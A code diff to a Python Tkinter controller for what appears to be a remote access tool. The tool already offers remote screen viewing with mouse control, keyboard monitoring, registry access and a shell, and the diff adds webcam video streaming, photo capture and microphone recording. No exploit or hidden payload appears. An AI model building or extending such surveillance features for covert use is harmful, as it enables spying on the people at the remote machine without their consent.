@@ -29,9 +29,14 @@ class VisualClientUI(tk.Tk):
         self.is_connected = False
         self.streaming = False
         self.keyboard_monitoring = False
+        self.camera_streaming = False  # 摄像头视频流状态
 
         # Socket锁，防止多线程竞争
         self.sock_lock = threading.Lock()
+
+        # 屏幕流的原始尺寸（用于鼠标坐标映射）
+        self.original_screen_size = None  # (width, height)
+        self.displayed_image_size = None  # (width, height) 实际显示的尺寸
 
         self._init_login_ui()
 
@@ -87,6 +92,7 @@ class VisualClientUI(tk.Tk):
         self._create_sysinfo_tab()        # 9. 系统信息（静态）
         self._create_files_tab()          # 3. 文件管理
         self._create_screen_tab()         # 7. 屏幕实时查看+鼠标控制
+        self._create_camera_tab()         # 摄像头视频流
         self._create_registry_tab()       # 5. 注册表管理
         self._create_keyboard_tab()       # 8. 键盘监控
         self._create_shell_tab()          # 4. Shell终端
@@ -433,20 +439,226 @@ class VisualClientUI(tk.Tk):
         self.screen_label.bind('<Button-1>', self.on_screen_click)
         self.screen_label.bind('<Button-3>', self.on_screen_right_click)
 
+    # ==================== 标签页4: 摄像头视频流 ====================
+
+    def _create_camera_tab(self):
+        """创建摄像头视频流标签页"""
+        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
+        self.notebook.add(tab, text="📷 CAMERA")
+
+        # 控制栏
+        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
+        control_frame.pack(fill='x', padx=10, pady=10)
+
+        self.btn_start_camera = tk.Button(control_frame, text="▶ START VIDEO",
+                                          command=self.start_camera_stream,
+                                          bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
+                                          relief='flat')
+        self.btn_start_camera.pack(side='left', padx=5)
+
+        self.btn_stop_camera = tk.Button(control_frame, text="⏹ STOP VIDEO",
+                                         command=self.stop_camera_stream,
+                                         bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
+                                         relief='flat', state='disabled')
+        self.btn_stop_camera.pack(side='left', padx=5)
+
+        tk.Button(control_frame, text="📸 TAKE PHOTO", command=self.req_camera,
+                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        tk.Button(control_frame, text="🎤 RECORD MIC", command=self.req_mic_record,
+                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
+                 relief='flat').pack(side='left', padx=5)
+
+        # 质量滑块
+        tk.Label(control_frame, text="Quality:", bg=COLORS['bg_lighter'],
+                fg='white', font=FONTS['body']).pack(side='left', padx=10)
+
+        self.camera_quality_scale = tk.Scale(control_frame, from_=10, to=100, orient='horizontal',
+                                             bg=COLORS['bg_lighter'], fg='white',
+                                             highlightthickness=0, length=150)
+        self.camera_quality_scale.set(70)
+        self.camera_quality_scale.pack(side='left')
+
+        # 摄像头显示区域
+        self.camera_label = tk.Label(tab, bg='black', text="Camera video will appear here\nClick START VIDEO to begin",
+                                     fg=COLORS['fg_white'], font=FONTS['h2'])
+        self.camera_label.pack(fill='both', expand=True, padx=10, pady=10)
+
+    def start_camera_stream(self):
+        """开始摄像头视频流"""
+        if self.camera_streaming:
+            return
+
+        quality = self.camera_quality_scale.get()
+
+        def _start():
+            try:
+                with self.sock_lock:
+                    # 使用 VIDEO_START 消息启动摄像头流
+                    msg = create_video_start_message(width=640, height=480, fps=30, quality=quality)
+                    send_message(self.sock, msg)
+                    resp = receive_message(self.sock)
+
+                    if resp and resp['type'] == MessageType.VIDEO_START:
+                        if resp['data'].get('success'):
+                            self.camera_streaming = True
+                            self.after(0, lambda: self.btn_start_camera.config(state='disabled'))
+                            self.after(0, lambda: self.btn_stop_camera.config(state='normal'))
+                            # 开始接收视频帧
+                            threading.Thread(target=self._camera_stream_loop, daemon=True).start()
+                            self.add_history("Camera", "Started camera video stream", "Success")
+                        else:
+                            error = resp['data'].get('error', 'Unknown error')
+                            self.after(0, lambda: messagebox.showerror("Error", f"Failed to start camera: {error}"))
+            except Exception as e:
+                print(f"Start camera stream error: {e}")
+                self.after(0, lambda: messagebox.showerror("Error", f"Camera error: {e}"))
+
+        threading.Thread(target=_start, daemon=True).start()
+
+    def stop_camera_stream(self):
+        """停止摄像头视频流"""
+        if not self.camera_streaming:
+            return
+
+        self.camera_streaming = False
+
+        def _stop():
+            try:
+                time.sleep(0.2)  # 给流线程时间退出
+                with self.sock_lock:
+                    send_message(self.sock, create_video_stop_message())
+
+                    # 清理残留数据
+                    self.sock.settimeout(2.0)
+                    try:
+                        while True:
+                            msg = receive_message(self.sock)
+                            if not msg:
+                                break
+                            if msg['type'] == MessageType.VIDEO_STOP:
+                                print("Received VIDEO_STOP confirmation")
+                                break
+                            elif msg['type'] == MessageType.VIDEO_FRAME:
+                                _ = receive_binary_data(self.sock)
+                                print("Discarded residual camera frame")
+                            else:
+                                break
+                    except Exception as e:
+                        print(f"Cleanup camera residual: {e}")
+                    finally:
+                        self.sock.settimeout(None)
+            except Exception as e:
+                print(f"Stop camera stream error: {e}")
+
+        threading.Thread(target=_stop, daemon=True).start()
+
+        self.camera_label.config(image='', text="Camera stopped\nClick START VIDEO to resume")
+        self.btn_start_camera.config(state='normal')
+        self.btn_stop_camera.config(state='disabled')
+        self.add_history("Camera", "Stopped camera video stream", "Success")
+
+    def _camera_stream_loop(self):
+        """摄像头视频帧接收循环"""
+        try:
+            while self.camera_streaming:
+                try:
+                    with self.sock_lock:
+                        msg = receive_message(self.sock)
+                        if not msg:
+                            break
+
+                        if msg['type'] == MessageType.VIDEO_FRAME:
+                            img_bytes = receive_binary_data(self.sock)
+                            if img_bytes:
+                                image = Image.open(io.BytesIO(img_bytes))
+                                # 缩放以适应显示区域
+                                image.thumbnail((800, 450))
+                                photo = ImageTk.PhotoImage(image)
+
+                                if self.camera_streaming:
+                                    self.after(0, lambda p=photo: self._update_camera_frame(p))
+                        elif msg['type'] == MessageType.VIDEO_STOP:
+                            break
+                except Exception as e:
+                    print(f"Camera frame error: {e}")
+                    break
+        except Exception as e:
+            print(f"Camera stream error: {e}")
+        finally:
+            self.camera_streaming = False
+            self.after(0, lambda: self.btn_start_camera.config(state='normal'))
+            self.after(0, lambda: self.btn_stop_camera.config(state='disabled'))
+
+    def _update_camera_frame(self, photo):
+        """更新摄像头帧"""
+        try:
+            self.camera_label.configure(image=photo, text='')
+            self.camera_label.image = photo
+        except:
+            pass
+
+    def _map_click_to_screen_coords(self, click_x, click_y):
+        """
+        将点击坐标从显示图像映射到原始屏幕坐标
+
+        Args:
+            click_x, click_y: 相对于 screen_label 的点击坐标
+
+        Returns:
+            (screen_x, screen_y): 映射后的屏幕坐标，失败返回 None
+        """
+        if not self.original_screen_size or not self.displayed_image_size:
+            return None
+
+        original_w, original_h = self.original_screen_size
+        displayed_w, displayed_h = self.displayed_image_size
+
+        # 获取 label 的实际尺寸
+        label_w = self.screen_label.winfo_width()
+        label_h = self.screen_label.winfo_height()
+
+        # 图像在 label 中居中显示，计算偏移量
+        offset_x = (label_w - displayed_w) // 2
+        offset_y = (label_h - displayed_h) // 2
+
+        # 计算相对于图像的坐标
+        img_x = click_x - offset_x
+        img_y = click_y - offset_y
+
+        # 检查点击是否在图像范围内
+        if img_x < 0 or img_x >= displayed_w or img_y < 0 or img_y >= displayed_h:
+            return None
+
+        # 映射到原始屏幕坐标
+        screen_x = int(img_x * original_w / displayed_w)
+        screen_y = int(img_y * original_h / displayed_h)
+
+        return screen_x, screen_y
+
     def on_screen_click(self, event):
         """处理屏幕点击（鼠标控制）"""
         if not self.streaming:
             return
 
-        # 获取点击位置相对于图像的坐标
-        x, y = event.x, event.y
+        # 映射坐标到实际屏幕坐标
+        coords = self._map_click_to_screen_coords(event.x, event.y)
+        if coords is None:
+            print("Click outside of screen image area")
+            return
+
+        screen_x, screen_y = coords
 
         def _thread():
             try:
                 with self.sock_lock:
-                    send_message(self.sock, create_mouse_event_message('click', x, y, 'left', 1))
+                    send_message(self.sock, create_mouse_event_message('click', screen_x, screen_y, 'left', 1))
                     resp = receive_message(self.sock)
-                    print(f"Mouse click sent: ({x}, {y})")
+                    if resp and resp.get('data', {}).get('success'):
+                        print(f"Mouse click sent: display({event.x}, {event.y}) -> screen({screen_x}, {screen_y})")
+                    else:
+                        print(f"Mouse click failed: {resp}")
             except Exception as e:
                 print(f"Mouse click error: {e}")
 
@@ -457,14 +669,23 @@ class VisualClientUI(tk.Tk):
         if not self.streaming:
             return
 
-        x, y = event.x, event.y
+        # 映射坐标到实际屏幕坐标
+        coords = self._map_click_to_screen_coords(event.x, event.y)
+        if coords is None:
+            print("Right-click outside of screen image area")
+            return
+
+        screen_x, screen_y = coords
 
         def _thread():
             try:
                 with self.sock_lock:
-                    send_message(self.sock, create_mouse_event_message('click', x, y, 'right', 1))
+                    send_message(self.sock, create_mouse_event_message('click', screen_x, screen_y, 'right', 1))
                     resp = receive_message(self.sock)
-                    print(f"Mouse right-click sent: ({x}, {y})")
+                    if resp and resp.get('data', {}).get('success'):
+                        print(f"Mouse right-click sent: display({event.x}, {event.y}) -> screen({screen_x}, {screen_y})")
+                    else:
+                        print(f"Mouse right-click failed: {resp}")
             except Exception as e:
                 print(f"Mouse right-click error: {e}")
 
@@ -489,14 +710,41 @@ class VisualClientUI(tk.Tk):
 
     def stop_screen_stream(self):
         """停止屏幕流"""
+        if not self.streaming:
+            return
+
         self.streaming = False
 
-        # 在独立线程中发送停止消息，避免死锁
+        # 在独立线程中发送停止消息并清理残留数据
         def _send_stop():
             try:
-                time.sleep(0.1)  # 给流线程一点时间释放锁
+                time.sleep(0.2)  # 给流线程时间处理最后的帧并释放锁
                 with self.sock_lock:
                     send_message(self.sock, create_screen_stop_message())
+
+                    # 等待并接收服务器的 SCREEN_STOP 响应，清理残留数据
+                    # 设置超时以避免无限等待
+                    self.sock.settimeout(2.0)
+                    try:
+                        while True:
+                            msg = receive_message(self.sock)
+                            if not msg:
+                                break
+                            if msg['type'] == MessageType.SCREEN_STOP:
+                                print("Received SCREEN_STOP confirmation from server")
+                                break
+                            elif msg['type'] == MessageType.SCREEN_FRAME:
+                                # 丢弃残留的帧数据
+                                _ = receive_binary_data(self.sock)
+                                print("Discarded residual screen frame")
+                            else:
+                                # 收到其他类型的消息，可能是正常的响应
+                                break
+                    except Exception as e:
+                        print(f"Cleanup residual data: {e}")
+                    finally:
+                        self.sock.settimeout(None)  # 恢复阻塞模式
+
             except Exception as e:
                 print(f"Send stop message error: {e}")
 
@@ -525,8 +773,21 @@ class VisualClientUI(tk.Tk):
                             img_bytes = receive_binary_data(self.sock)
                             if img_bytes:
                                 image = Image.open(io.BytesIO(img_bytes))
-                                # 缩放以适应标签页
-                                image.thumbnail((900, 500))
+                                # 保存原始屏幕尺寸（用于鼠标坐标映射）
+                                self.original_screen_size = image.size  # (width, height)
+
+                                # 缩放以适应标签页，保持纵横比
+                                original_w, original_h = image.size
+                                max_w, max_h = 900, 500
+
+                                # 计算缩放比例
+                                scale = min(max_w / original_w, max_h / original_h)
+                                new_w = int(original_w * scale)
+                                new_h = int(original_h * scale)
+
+                                image = image.resize((new_w, new_h), Image.Resampling.LANCZOS)
+                                self.displayed_image_size = (new_w, new_h)
+
                                 photo = ImageTk.PhotoImage(image)
 
                                 if self.streaming:
@@ -540,6 +801,8 @@ class VisualClientUI(tk.Tk):
             print(f"Stream error: {e}")
         finally:
             self.streaming = False
+            self.original_screen_size = None
+            self.displayed_image_size = None
             self.after(0, lambda: self.btn_start_stream.config(state='normal'))
             self.after(0, lambda: self.btn_stop_stream.config(state='disabled'))
 
@@ -965,6 +1228,7 @@ class VisualClientUI(tk.Tk):
         """断开连接"""
         self.streaming = False
         self.keyboard_monitoring = False
+        self.camera_streaming = False
         if self.sock:
             try:
                 send_message(self.sock, create_disconnect_message())
